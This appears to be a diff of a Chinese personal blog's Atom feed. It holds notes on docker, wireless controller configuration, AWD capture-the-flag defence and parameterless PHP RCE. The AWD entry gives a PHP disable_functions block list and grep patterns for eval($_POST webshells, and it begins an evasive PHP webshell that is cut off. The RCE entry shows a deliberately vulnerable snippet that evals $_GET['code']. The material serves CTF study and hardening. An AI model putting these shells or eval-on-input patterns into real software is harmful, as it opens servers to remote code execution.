+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;docker&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-it&lt;/span&gt; 容器id /bin/bash&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+        <category term="笔记" scheme="http://m3k0mi.github.io/categories/%E7%AC%94%E8%AE%B0/" />
+        <category term="docker" scheme="http://m3k0mi.github.io/categories/%E7%AC%94%E8%AE%B0/docker/" />
+        <category term="笔记" scheme="http://m3k0mi.github.io/tags/%E7%AC%94%E8%AE%B0/" />
+        <updated>2024-05-23T08:04:23.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://m3k0mi.github.io/2024/05/16/%E6%97%A0%E7%BA%BFAC/</id>
+        <title>无线AC</title>
+        <link rel="alternate" href="http://m3k0mi.github.io/2024/05/16/%E6%97%A0%E7%BA%BFAC/"/>
+        <content type="html">&lt;h3 id=&#34;开启无线功能&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#开启无线功能&#34;&gt;#&lt;/a&gt; 开启无线功能&lt;/h3&gt;
+&lt;p&gt;AC(config)#wireless&lt;br /&gt;
+AC(config-wireless)#enable&lt;/p&gt;
+&lt;h3 id=&#34;配置静态无线ip地址&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置静态无线ip地址&#34;&gt;#&lt;/a&gt; 配置静态无线 ip 地址&lt;/h3&gt;
+&lt;p&gt;AC(config-wireless)#static-ip 10.10.2.1&lt;/p&gt;
+&lt;h3 id=&#34;创建ssid&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建ssid&#34;&gt;#&lt;/a&gt; 创建 ssid&lt;/h3&gt;
+&lt;p&gt;AC(config-wireless)#network 14&lt;br /&gt;
+AC(config-network)#ssid Wifi-2.4G	&lt;a href=&#34;//xn--ssidWifi-2-1x2pl83k0g4g8j6b.4G&#34;&gt;// 将 ssid 配置为 Wifi-2.4G&lt;/a&gt;&lt;br /&gt;
+AC (config-network)#vlan 140	// 使用 vlan140&lt;br /&gt;
+AC (config-network)#security mode wpa-personal	// 加密方式为 wpa-personal&lt;br /&gt;
+AC(config-network)#wpa key Wifi-2.4G	&lt;a href=&#34;//xn--Wifi-2-vy7ij9b42z.4G&#34;&gt;// 口令为 Wifi-2.4G&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;AC (config-network)#security mode static-wep	// 加密方式为 static-wep&lt;br /&gt;
+AC (config-network)#wep key type ascii	// 配置 share key 的编码类型&lt;br /&gt;
+ AC (config-network)#wep key 1234567890123	// 口令为 1234567890123&lt;/p&gt;
+&lt;p&gt;AC(config-wireless)#network 1&lt;br /&gt;
+AC (config-network)#hide ssid	// 隐藏 network 1&lt;/p&gt;
+&lt;h3 id=&#34;射频管理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#射频管理&#34;&gt;#&lt;/a&gt; 射频管理&lt;/h3&gt;
+&lt;p&gt;AC(config-wireless)#ap profile 1&lt;br /&gt;
+AC (config-ap)#name WIFI	// 将 ap 命名为 WIFI&lt;br /&gt;
+AC (config-ap)#radio 1	//radio 1 对应 AP 上 2.4Ghz 工作频段，radio 2 对应 AP 上 5Ghz 工作频段&lt;br /&gt;
+ AC (config-ap)#mode bg	&lt;a href=&#34;//xn--802-c88dv5co94bh6cf0cz03b5v2cvk2axf6a.11bg&#34;&gt;// 设置射频工作模式为 802.11bg&lt;/a&gt;&lt;br /&gt;
+AC (config-ap)#vap 13	//network1 对应 vap0，network2 对应 vap1。所以这应该是 vap13&lt;br /&gt;
+AC(config-ap)#enable&lt;/p&gt;
+&lt;p&gt;AC(config-ap)#radio 2&lt;br /&gt;
+AC(config-ap)#mode a	&lt;a href=&#34;//802.xn--11a5GHz-r35km3p0spd6rlv2ae9jul2n&#34;&gt;//802.11a 标准工作在 5GHz 频段&lt;/a&gt;&lt;br /&gt;
+ AC (config-ap)#vap 14&lt;br /&gt;
+AC(config-ap)#enable&lt;/p&gt;
+&lt;h3 id=&#34;arp抑制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arp抑制&#34;&gt;#&lt;/a&gt; arp 抑制&lt;/h3&gt;
+&lt;p&gt;AC (config-network)#arp-suppression	// 开启 arp 抑制&lt;/p&gt;
+&lt;h3 id=&#34;用户隔离&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户隔离&#34;&gt;#&lt;/a&gt; 用户隔离&lt;/h3&gt;
+&lt;p&gt;AC (config-network)#station-isolation	// 开启用户隔离&lt;/p&gt;
+&lt;h3 id=&#34;限时策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#限时策略&#34;&gt;#&lt;/a&gt; 限时策略&lt;/h3&gt;
+&lt;p&gt;基于 network&lt;/p&gt;
+&lt;p&gt;AC(config-wireless)# network 2&lt;br /&gt;
+AC(config-network)# time-limit from 7:0 to 17:0 weekday Monday&lt;/p&gt;
+&lt;p&gt;基于 radio&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;//2.xn--4G06-m84fzbh978a67d4pcda865c8rbca4369c9thviy74vca4706bwjgezw&#34;&gt;//2.4G 信号周一到周三早上 0 点到 6 点禁止终端接入&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;AC(config-wireless)#ap profile 1&lt;br /&gt;
+AC(config-ap-profile)#radio 1&lt;br /&gt;
+AC(config-ap-profile-radio)#time-limit from 00:00 to 06:00 weekday monday&lt;br /&gt;
+AC(config-ap-profile-radio)#time-limit from 00:00 to 06:00 weekday tuesday&lt;br /&gt;
+AC(config-ap-profile-radio)#time-limit from 00:00 to 06:00 weekday wednesday&lt;/p&gt;
+&lt;h3 id=&#34;client-qos&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#client-qos&#34;&gt;#&lt;/a&gt; Client QoS&lt;/h3&gt;
+&lt;p&gt;AC (config-wireless)#ap client-qos	// 启动 Client Qos 功能&lt;br /&gt;
+ AC (config-wireless)#network 14&lt;br /&gt;
+AC (config-network)#client-qos bandwidth-limit up 2048	// 配置上行速度为 2Mbps&lt;br /&gt;
+AC (config-network)#client-qos bandwidth-limit down 5120	// 配置下行速度为 5Mbps&lt;/p&gt;
+&lt;h3 id=&#34;mac黑名单&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mac黑名单&#34;&gt;#&lt;/a&gt; MAC 黑名单&lt;/h3&gt;
+&lt;p&gt;AC (config-wireless)#mac-authentication-mode black-list	// 开启黑名单 (white-list 白名单)&lt;br /&gt;
+ AC (config-wireless)#know-client 00-e1-3a-10-be-51 action global-action	// 添加进黑名单，只有 action 设置为 global 时设置才启作用，在黑名单中被拒绝，相反在白名单中被接受。&lt;br /&gt;
+AC(config-wireless)# network 14&lt;br /&gt;
+AC (config-network)# mac authentication  local	// 打开 mac 认证，并设置本地认证&lt;/p&gt;
+&lt;h3 id=&#34;无线信号强度低于50的禁止连接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无线信号强度低于50的禁止连接&#34;&gt;#&lt;/a&gt; 无线信号强度低于 50% 的禁止连接&lt;/h3&gt;
+&lt;p&gt;AC(config-wireless)#ap profile 1&lt;br /&gt;
+AC(config-ap-profile)#radio 1&lt;br /&gt;
+AC(config-ap-profile-radio)#client-reject rssi-threshold 50&lt;/p&gt;
+&lt;h3 id=&#34;时空公平&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#时空公平&#34;&gt;#&lt;/a&gt; 时空公平&lt;/h3&gt;
+&lt;p&gt;AC (config-ap-profile-radio)#schedule-mode fair	// 每个客户端机会均等获得传输机会&lt;/p&gt;
+&lt;h3 id=&#34;ap-flood&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ap-flood&#34;&gt;#&lt;/a&gt; AP FLOOD&lt;/h3&gt;
+&lt;p&gt;AC (config-wireless)#wireless ap anti-flood interval 10	// 检测时间 10 分钟&lt;br /&gt;
+ AC (config-wireless)#wireless ap anti-flood max-conn-count 5	// 设置最大连接次数 5 分钟&lt;br /&gt;
+ AC (config-wireless)#wireless ap anti-flood agetime 120	// 设置老化时间 2 小时&lt;/p&gt;
+&lt;h3 id=&#34;自动信道调整&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自动信道调整&#34;&gt;#&lt;/a&gt; 自动信道调整&lt;/h3&gt;
+&lt;p&gt;AC(config-ap-profile)#channel-plan an time 07:00&lt;br /&gt;
+AC(config-ap-profile)#channel-plan bgn time 07:00&lt;/p&gt;
+</content>
+        <category term="笔记" scheme="http://m3k0mi.github.io/categories/%E7%AC%94%E8%AE%B0/" />
+        <category term="无线AC" scheme="http://m3k0mi.github.io/categories/%E7%AC%94%E8%AE%B0/%E6%97%A0%E7%BA%BFAC/" />
+        <category term="笔记" scheme="http://m3k0mi.github.io/tags/%E7%AC%94%E8%AE%B0/" />
+        <updated>2024-05-16T05:58:19.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://m3k0mi.github.io/2024/05/11/awd/</id>
+        <title>awd</title>
+        <link rel="alternate" href="http://m3k0mi.github.io/2024/05/11/awd/"/>
+        <content type="html">&lt;h3 id=&#34;ssh登录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh登录&#34;&gt;#&lt;/a&gt; ssh 登录&lt;/h3&gt;
+&lt;p&gt;ssh [-p port] &lt;a href=&#34;mailto:user@192.168.1.2&#34;&gt;user@192.168.1.2&lt;/a&gt;	// 使用用户名密码&lt;/p&gt;
+&lt;p&gt;ssh -i id_rsa roo	// 使用私钥&lt;/p&gt;
+&lt;h3 id=&#34;ssh私钥生成&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh私钥生成&#34;&gt;#&lt;/a&gt; ssh 私钥生成&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ssh-keygen &lt;span class=&#34;token parameter variable&#34;&gt;-t&lt;/span&gt; rsa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;cd&lt;/span&gt; /root/.ssh&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cp&lt;/span&gt; id_rsa.pub authorized_keys&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;chmod&lt;/span&gt; +x authorized_keys&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; id_rsa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;scp命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#scp命令&#34;&gt;#&lt;/a&gt; scp 命令&lt;/h3&gt;
+&lt;p&gt;用于 linux 之间复制文件和目录&lt;/p&gt;
+&lt;p&gt;-q 不显示传输进度条&lt;/p&gt;
+&lt;p&gt;-r 递归复制整个目录&lt;/p&gt;
+&lt;p&gt;-i 从指定文件中读取传输时使用的密钥文件&lt;/p&gt;
+&lt;p&gt;-P 指定数据传输使用到的端口&lt;/p&gt;
+&lt;p&gt;从远程复制到本地&lt;/p&gt;
+&lt;p&gt;上传和下载源码：&lt;/p&gt;
+&lt;p&gt;scp username@servername:/path/filename/tmp/local_destination  // 从服务器下载单个文件到本地&lt;br /&gt;
+ scp /path/local_filename username@servername:/path             // 从本地上传单个文件到服务器&lt;br /&gt;
+ scp -r username@servername:remote_dir//tmp/local_dir          // 从服务器下载整个目录到本地&lt;br /&gt;
+ scp -r /tmp/local_dir username@servername:remote_dir           // 从本地上传整个目录到服务器&lt;/p&gt;
+&lt;h3 id=&#34;通过ssh传文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过ssh传文件&#34;&gt;#&lt;/a&gt; 通过 ssh 传文件&lt;/h3&gt;
+&lt;p&gt;使用 scp 命令&lt;/p&gt;
+&lt;p&gt;scp（Secure Copy）是基于 SSH 协议的文件复制工具，它允许用户在本地和远程系统之间安全地复制文件或目录。&lt;/p&gt;
+&lt;p&gt;从本地复制到远程服务器：&lt;/p&gt;
+&lt;p&gt;scp /path/to/local/file username@remote_host:/path/to/remote/directory&lt;/p&gt;
+&lt;p&gt;这个命令会提示输入远程服务器的密码，然后将本地文件复制到远程服务器指定的目录。&lt;/p&gt;
+&lt;p&gt;从远程服务器复制到本地：&lt;/p&gt;
+&lt;p&gt;scp username@remote_host:/path/to/remote/file /path/to/local/directory&lt;/p&gt;
+&lt;p&gt;同样，这个命令也需要输入远程服务器的密码，然后将远程服务器上的文件复制到本地指定的目录。&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;使用 rsync 命令&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;rsync 是一个功能强大的文件同步和传输工具，它支持本地和远程之间的文件同步，并且可以进行增量备份。&lt;/p&gt;
+&lt;p&gt;基本的&lt;strong&gt; rsync&lt;/strong&gt; 命令：&lt;/p&gt;
+&lt;p&gt;rsync -avz -e ssh /path/to/local/file username@remote_host:/path/to/remote/directory&lt;/p&gt;
+&lt;p&gt;这个命令通过 SSH 连接到远程服务器，并将本地文件同步到远程目录。选项 - a 表示归档模式，-v 表示详细模式，-z 表示压缩数据。&lt;/p&gt;
+&lt;p&gt;增量同步： rsync 可以只同步发生变化的文件，这在频繁备份时非常有用：&lt;/p&gt;
+&lt;p&gt;rsync -avz -e ssh --delete username@remote_host:/path/to/remote/file /path/to/local/directory&lt;/p&gt;
+&lt;p&gt;--delete 选项会删除本地目录中不存在的文件，确保两边的文件保持一致。&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;使用 sshfs 挂载远程文件系统&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;sshfs（SSH File System）允许你将远程文件系统挂载到本地，就像操作本地文件系统一样。&lt;/p&gt;
+&lt;p&gt;挂载远程文件系统：&lt;/p&gt;
+&lt;p&gt;sshfs username@remote_host:/path/to/remote/directory /path/to/local/mountpoint -o follow_symlinks&lt;/p&gt;
+&lt;p&gt;这个命令会将远程目录挂载到本地的挂载点。-o follow_symlinks 选项允许跟随符号链接。&lt;/p&gt;
+&lt;h3 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h3&gt;
+&lt;h4 id=&#34;查看当前用户信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看当前用户信息&#34;&gt;#&lt;/a&gt; 查看当前用户信息&lt;/h4&gt;
+&lt;p&gt;cat /etc/passwd、ls /home&lt;/p&gt;
+&lt;h4 id=&#34;寻找源码位置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#寻找源码位置&#34;&gt;#&lt;/a&gt; 寻找源码位置&lt;/h4&gt;
+&lt;p&gt;常规路径如：/var/www/html、/app 或使用命令 find /-name &amp;quot;index*&amp;quot;&lt;/p&gt;
+&lt;h3 id=&#34;源码备份&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#源码备份&#34;&gt;#&lt;/a&gt; 源码备份&lt;/h3&gt;
+&lt;h4 id=&#34;备份位置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#备份位置&#34;&gt;#&lt;/a&gt; 备份位置&lt;/h4&gt;
+&lt;p&gt;1. 本地&lt;br /&gt;
+ 2. 服务器上非 web 路径 /tmp/home/xxx&lt;/p&gt;
+&lt;h4 id=&#34;源码备份-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#源码备份-2&#34;&gt;#&lt;/a&gt; 源码备份&lt;/h4&gt;
+&lt;p&gt;scp 或工具直接拖出&lt;/p&gt;
+&lt;p&gt;scp local_file remote_username@remote_ip:remote_folder&lt;/p&gt;
+&lt;p&gt;tar&lt;/p&gt;
+&lt;p&gt;tar -cvf /home/user/html.tar /var/www/html&lt;/p&gt;
+&lt;h4 id=&#34;数据库备份&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库备份&#34;&gt;#&lt;/a&gt; 数据库备份&lt;/h4&gt;
+&lt;p&gt;mysqldump -u 用户名 -p 密码 -all-databases &amp;gt; 备份文件.sql&lt;/p&gt;
+&lt;p&gt;mysqldump -u 用户名 -p 密码 数据库名 &amp;gt; 备份文件.sql&lt;/p&gt;
+&lt;h4 id=&#34;数据库恢复&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库恢复&#34;&gt;#&lt;/a&gt; 数据库恢复&lt;/h4&gt;
+&lt;p&gt;mysql -u 用户名 -p 密码 数据库名 &amp;lt; 备份文件.sql&lt;/p&gt;
+&lt;h4 id=&#34;远程连接数据库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#远程连接数据库&#34;&gt;#&lt;/a&gt; 远程连接数据库&lt;/h4&gt;
+&lt;p&gt;mysql -h192.168.5.116 -P3306 -uroot -p123456&lt;/p&gt;
+&lt;h3 id=&#34;口令更改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#口令更改&#34;&gt;#&lt;/a&gt; 口令更改&lt;/h3&gt;
+&lt;h4 id=&#34;ssh密码更改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh密码更改&#34;&gt;#&lt;/a&gt; ssh 密码更改&lt;/h4&gt;
+&lt;p&gt;echo ctf:123456|chpasswd&lt;/p&gt;
+&lt;p&gt;passwd&lt;/p&gt;
+&lt;h4 id=&#34;删除用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#删除用户&#34;&gt;#&lt;/a&gt; 删除用户&lt;/h4&gt;
+&lt;p&gt;userdel -r 用户名&lt;/p&gt;
+&lt;h4 id=&#34;数据库密码更改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库密码更改&#34;&gt;#&lt;/a&gt; 数据库密码更改&lt;/h4&gt;
+&lt;p&gt;set password = password(&#39;newpasswd&#39;)&lt;/p&gt;
+&lt;h4 id=&#34;站点密码修改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#站点密码修改&#34;&gt;#&lt;/a&gt; 站点密码修改&lt;/h4&gt;
+&lt;p&gt;尝试弱口令登录后台，未能成功可以尝试进入数据库修改&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;配置文件方式的后台&lt;/strong&gt;密码&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; /var/www//html &lt;span class=&#34;token parameter variable&#34;&gt;-path&lt;/span&gt; &#39; config ’ &lt;span class=&#34;token comment&#34;&gt;#查找配置文件中的密码凭证&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;数据库后台管理员密码&lt;br /&gt;
+ mysql -u root -p&lt;br /&gt;
+show databases；&lt;br /&gt;
+use test; 打开站点的数据库&lt;br /&gt;
+ show tables; 打开站点的用户表&lt;br /&gt;
+ select * from admin;&lt;br /&gt;
+updata admin set user pass=’123456’; //updata 表名 set 字段名 = ‘值’;&lt;br /&gt;
+flush privileges;&lt;/p&gt;
+&lt;h3 id=&#34;监控流量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#监控流量&#34;&gt;#&lt;/a&gt; 监控流量&lt;/h3&gt;
+&lt;p&gt;抓取特定端口的流量&lt;/p&gt;
+&lt;p&gt;tcpdump tcp -t -s 0 and port 80 -w target.pcap&lt;/p&gt;
+&lt;p&gt;抓取特定网卡流量&lt;/p&gt;
+&lt;p&gt;tcpdump -i eth0 -w target.pcap&lt;/p&gt;
+&lt;h3 id=&#34;日志分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志分析&#34;&gt;#&lt;/a&gt; 日志分析&lt;/h3&gt;
+&lt;p&gt;apache: /var/log/apache2/access.log&lt;/p&gt;
+&lt;p&gt;nginx: /var/log/nginx/&lt;/p&gt;
+&lt;h3 id=&#34;web根目录设置只读和执行权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web根目录设置只读和执行权限&#34;&gt;#&lt;/a&gt; Web 根目录设置只读和执行权限&lt;/h3&gt;
+&lt;p&gt;chmod 0555 /var/www/html&lt;/p&gt;
+&lt;h3 id=&#34;php参数安全配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php参数安全配置&#34;&gt;#&lt;/a&gt; PHP 参数安全配置&lt;/h3&gt;
+&lt;p&gt;首先找到 PHP 的配置文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/etc/php/&amp;#123;version&amp;#125;/php.ini
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;禁用高危函数&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;disable_functions = dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;配置  &lt;code&gt;open_basedir&lt;/code&gt;  （将用户访问文件的活动范围限制在指定的区域）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;open_basedir=/var/www/html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;禁用魔术引号（自动对外部来源数据进行转义，防止 SQL 注入）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;magic_quotes_gpc = Off
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;关闭 PHP 伪协议&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;allow_url_fopen = Off
+allow_url_include = Off
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;重启 PHP&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo service php7.0-fpm restart
+sudo systemctl restart php7.0-fpm.service
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;应急响应&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#应急响应&#34;&gt;#&lt;/a&gt; 应急响应&lt;/h3&gt;
+&lt;h4 id=&#34;查询进程线程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询进程线程&#34;&gt;#&lt;/a&gt; 查询进程线程&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;netstat
+ps -aux
+netstat -apt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;杀掉进程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#杀掉进程&#34;&gt;#&lt;/a&gt; 杀掉进程&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;kill -9 pid            //Linux上
+taskkill /f /pid pid   //Windows上
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;搜索webshell文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜索webshell文件&#34;&gt;#&lt;/a&gt; 搜索 WebShell 文件&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;find /var/www/html -name *.php -mmin -5                        //查看最近5分钟修改文件
+find ./ -name &#39;*.php&#39; | xargs wc -l | sort -u                  //寻找行数最短文件，一般有可能是一句话木马
+grep -r --include=*.php  &#39;[^a-z]eval($_POST&#39;  /var/www/html    //查包含关键字的php文件
+find /var/www/html -type f -name &amp;quot;*.php&amp;quot; | xargs grep &amp;quot;eval(&amp;quot; |more //在Linux系统中使用find、grep和xargs命令的组合
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;免杀马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#免杀马&#34;&gt;#&lt;/a&gt; 免杀马&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?=~$_=&#39;$&amp;lt;&amp;gt;/&#39;^&#39;&lt;/code&gt;&lt;/pre&gt;
+</content>
+        <category term="笔记" scheme="http://m3k0mi.github.io/categories/%E7%AC%94%E8%AE%B0/" />
+        <category term="awd" scheme="http://m3k0mi.github.io/categories/%E7%AC%94%E8%AE%B0/awd/" />
+        <category term="笔记" scheme="http://m3k0mi.github.io/tags/%E7%AC%94%E8%AE%B0/" />
+        <updated>2024-05-11T04:53:18.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://m3k0mi.github.io/2024/05/09/%E6%97%A0%E5%8F%82%E6%95%B0rce/</id>
+        <title>无参数rce</title>
+        <link rel="alternate" href="http://m3k0mi.github.io/2024/05/09/%E6%97%A0%E5%8F%82%E6%95%B0rce/"/>
+        <content type="html">&lt;h3 id=&#34;无参数rce&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无参数rce&#34;&gt;#&lt;/a&gt; 无参数 rce&lt;/h3&gt;
+&lt;h4 id=&#34;核心代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#核心代码&#34;&gt;#&lt;/a&gt; 核心代码&lt;/h4&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/[^\W]+\((?R)?\)/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;code&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;code&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 